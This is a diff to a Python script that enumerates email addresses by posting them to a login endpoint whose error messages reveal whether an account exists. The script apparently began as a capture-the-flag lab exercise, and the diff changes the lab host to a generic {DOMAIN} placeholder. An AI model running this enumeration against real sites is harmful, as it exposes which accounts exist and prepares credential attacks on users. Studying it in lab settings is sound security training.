@@ -2,7 +2,7 @@ import requests
 import sys
 
 def check_email(email):
-    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
+    url = 'http://{DOMAIN}/path/to/verbose_login/functions.php'  # Location of the login function, change to actual value
     headers = {
         'Host': 'enum.thm',
         'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
@@ -11,13 +11,13 @@ def check_email(email):
         'Accept-Encoding': 'gzip, deflate',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'X-Requested-With': 'XMLHttpRequest',
-        'Origin': 'http://enum.thm',
+        'Origin': 'http://{DOMAIN}',
         'Connection': 'close',
-        'Referer': 'http://enum.thm/labs/verbose_login/',
+        'Referer': 'http://{DOMAIN}/path/to/verbose_login/',
     }
     data = {
         'username': email,
-        'password': 'password',  # Use a random password as we are only checking the email
+        'password': 'password',  # Use a random password since it's only checking the email
         'function': 'login'
     }
 
@@ -45,7 +45,7 @@ def enumerate_emails(email_file):
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Usage: python3 script.py <email_list_file>")
+        print("Usage: python3 email_checker.py <email_list_file>")
         sys.exit(1)
 
     email_file = sys.argv[1]
